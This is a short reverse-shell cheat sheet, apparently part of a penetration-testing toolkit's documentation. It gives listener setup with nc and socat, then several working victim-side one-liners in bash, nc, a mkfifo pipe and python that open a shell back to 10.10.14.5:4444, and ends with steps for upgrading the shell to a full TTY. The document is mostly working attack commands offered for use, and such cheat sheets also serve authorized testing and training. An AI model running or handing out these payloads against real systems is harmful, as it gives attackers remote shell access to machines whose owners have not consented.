# Reverse shells & TTY upgrade

> Authorized use only. Generate one-liners with
> [`scripts/shells/revshell.py`](../scripts/shells/revshell.py) or archpwm's `revshell`.

## 1. Start the listener

```bash
rlwrap nc -lvnp 4444          # rlwrap gives history/arrow keys
# or, for a full pty (pairs with the socat payload):
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

## 2. Fire the shell (victim side)

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1          # bash
nc -e /bin/sh 10.10.14.5 4444                       # if nc has -e
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Delivery through a web parameter? Use `--url-encode` or `--base64` on `revshell.py`.

## 3. Stabilize the shell (dumb → full TTY)

```bash
# in the reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or python / script -qc /bin/bash /dev/null
export TERM=xterm

# background it: Ctrl+Z, then locally:
stty raw -echo; fg
# press Enter twice. Now Ctrl+C, tab-completion and editors work.

# match your terminal size (get rows/cols with `stty size` locally):
stty rows 50 cols 200
```

## 4. Windows

```powershell
# generate with: revshell.py <ip> <port> -t powershell
# listener stays the same (nc -lvnp)
```

For staged/binary payloads use archpwm's `genpayload` (msfvenom) instead.
